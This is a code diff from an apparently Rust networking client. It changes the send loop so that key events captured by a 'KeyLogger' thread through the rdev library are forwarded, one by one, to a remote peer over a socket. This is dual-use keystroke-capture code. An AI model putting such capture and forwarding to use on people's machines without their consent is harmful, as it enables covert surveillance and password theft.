@@ -40,34 +40,13 @@ impl Client {
     }
 
     async fn handle_send(mut writer: OwnedWriteHalf) {
-        let (tx, rx) = mpsc::channel::<String>();
-        let key_logger = KeyLogger::new(tx);
+        let (tx_key, rx_key) = mpsc::channel::<(rdev::Key, rdev::EventType)>();
+        let key_logger = KeyLogger::new(tx_key);
         std::thread::spawn(move || key_logger.listen());
 
         loop {
-            //let n = std::io::stdin().read(&mut buf).unwrap();
-            //if n == 0 {
-            //    break;
-            //}
-            //
-            //if &buf[0..3] == b"q\r\n" {
-            //    Message::disconnect().send(&mut writer).await.unwrap();
-            //    break;
-            //}
-            //
-            //let message = Message::text(buf[..n].to_vec());
-            //message.send(&mut writer).await.unwrap();
-            //
-            //tracing::info!("Sent {} bytes", n);
-
-            let message = rx.recv().unwrap();
-
-            if message == "exit" {
-                Message::disconnect().send(&mut writer).await.unwrap();
-                break;
-            }
-
-            let message = Message::text(message.into_bytes());
+            let (key, action) = rx_key.recv().unwrap();
+            let message = Message::key(key, action);
             message.send(&mut writer).await.unwrap();
         }
     }
